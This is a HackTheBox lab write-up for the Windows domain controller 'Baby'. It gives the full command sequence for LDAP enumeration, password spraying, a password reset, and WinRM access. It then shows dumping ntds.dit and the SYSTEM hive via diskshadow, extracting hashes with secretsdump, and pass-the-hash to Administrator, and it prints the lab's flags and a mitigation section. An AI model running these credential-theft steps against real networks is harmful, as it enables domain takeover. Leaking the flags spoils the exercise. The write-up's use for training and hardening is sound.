# Baby - HackTheBox Writeup (Complete Replication Guide)

**Date:** March 18, 2026
**OS:** Windows Server 2022
**IP Address:** 10.129.6.110 (baby.vl)
**Hostname:** BabyDC.baby.vl
**Difficulty:** Easy

---

# 1. Executive Summary

This writeup documents the complete, zero-to-root exploitation process for the HackTheBox machine **Baby**. This guide serves as a manual for replication and highlights critical misconfigurations in Active Directory environments.

---

# 2. Reconnaissance & Enumeration

## 2.1. Initial Nmap Scan
We start with an initial nmap scan against the target IP to discover running services.

```bash
nmap -sC -sV -oA nmap/initial 10.129.6.110
```

| Port | Protocol | State | Service | Version |
| :--- | :--- | :--- | :--- | :--- |
| **53** | tcp | open | domain | Simple DNS Plus |
| **88** | tcp | open | kerberos-sec | Microsoft Windows Kerberos |
| **135, 139** | tcp | open | msrpc/nb | Windows RPC/NetBIOS |
| **389, 3268** | tcp | open | ldap | Active Directory LDAP (Domain: baby.vl) |
| **445** | tcp | open | microsoft-ds | Windows Server 2022 SMB |
| **3389** | tcp | open | ms-wbt-server | RDP |
| **5985** | tcp | open | http | WinRM (HTTPAPI httpd 2.0) |

## 2.2. Host Resolution Setup
The nmap scan identifies the target domain as `baby.vl`. We add this to our `/etc/hosts` file for proper name resolution.

```bash
sudo echo "10.129.6.110  baby.vl" >> /etc/hosts
```

## 2.3. LDAP Info Disclosure
With the domain resolved, we perform an anonymous LDAP query.

**Command:**
```bash
ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://baby.vl
```

**Key Finding:**
The user `Teresa.Bell` has a default password in her description field:
`description: Set initial password to BabyStart123!`

---

# 3. Initial Access (User Flag)

## 3.1. Resource Preparation: User List (`users.txt`)
Extract the domain user list for password spraying.

**Command:**
```bash
ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://baby.vl | grep sAMAccountName: | awk '{print $2}' > users.txt
```

## 3.2. Password Spraying & Credential Discovery
Test the default password across the user list using `nxc`.

**Command:**
```bash
nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
```

**Output:**
`baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE`

## 3.3. Mandatory Password Reset
The `Caroline.Robinson` account requires a password change. We reset it via SMB:

```bash
smbpasswd -U BABY/caroline.robinson -r baby.vl
# New password entered when prompted: NewPass123
```

## 3.4. Establishing a Shell
Access the machine via Evil-WinRM.

```bash
evil-winrm -i baby.vl -u caroline.robinson -p NewPass123
```

**User Flag Capture:**
```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd \Users\Caroline.Robinson\Desktop
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> cat user.txt
d7f69a34f74680ed0fe01c1f1fb38ef4
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Identify exploitable privileges.

```powershell
whoami /priv
# SeBackupPrivilege: Enabled
```

## 4.2. Resource Preparation: `backup.txt`
To extract the locked `ntds.dit` file, we use `diskshadow`. 

**Create script in PowerShell with CRLF/ASCII:**
```powershell
$script = @(
"set verbose on",
"set metadata C:\Windows\Temp\test.cab",
"set context persistent",
"add volume C: alias cdrive",
"create",
"expose %cdrive% E:",
""
)
$script | Set-Content -Path backup.txt -Encoding Ascii
```

**Upload to target:**
```powershell
*Evil-WinRM* PS C:\> upload backup.txt
```

## 4.3. Volume Shadow Copy (VSS) Exploitation
Create and mount the snapshot of the `C:` drive to `E:`.

```powershell
*Evil-WinRM* PS C:\> diskshadow /s backup.txt
```

## 4.4. Extracting the Database & Hives
Copy the database from the shadow copy and save the `SYSTEM` hive.

```powershell
*Evil-WinRM* PS C:\> robocopy /b E:\Windows\ntds . ntds.dit
*Evil-WinRM* PS C:\> reg save hklm\system system
*Evil-WinRM* PS C:\> download ntds.dit
*Evil-WinRM* PS C:\> download system
```

## 4.5. Dumping Hashes & PtH (Root Access)
Decrypt the database locally and log in as Domain Administrator.

```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
```

**Pass-the-Hash Access:**
```bash
evil-winrm -i baby.vl -u administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```

**Root Flag:**
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
35d86121686fbcae73ca24717c3226d6
```

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| **Teresa.Bell** | `BabyStart123!` | LDAP description disclosure |
| **Caroline.Robinson** | `NewPass123` | Password spray/reset |
| **Administrator** | `ee4457ae59f1e3fbd764e33d9cef123d` | NTDS.dit dump |
| **User Flag** | `d7f69a34f74680ed0fe01c1f1fb38ef4` | Caroline's Desktop |
| **Root Flag** | `35d86121686fbcae73ca24717c3226d6` | Administrator's Desktop |

---

# 6. Detailed Prevention & Mitigation

## 6.1. LDAP Hardening
*   **Enforce LDAP Signing:** Configure Domain Controllers to require signed and sealed LDAP communication via Group Policy.
*   **Restrict Attribute Access:** Ensure standard users cannot read sensitive attributes (like `description`) for other accounts.

## 6.2. Credential Security
*   **LAPS Implementation:** Deploy **Windows Local Administrator Password Solution (LAPS)** to provide unique, randomized local admin passwords.
*   **MFA Implementation:** Require Multi-Factor Authentication for all administrative remote access (WinRM, RDP).

## 6.3. Privilege Limitation
*   **Audit Backup Operators:** Membership in the "Backup Operators" or "Server Operators" groups should be strictly limited and scrutinized.
*   **Protected Users Group:** Sensitive accounts should be added to the "Protected Users" group for enhanced security.
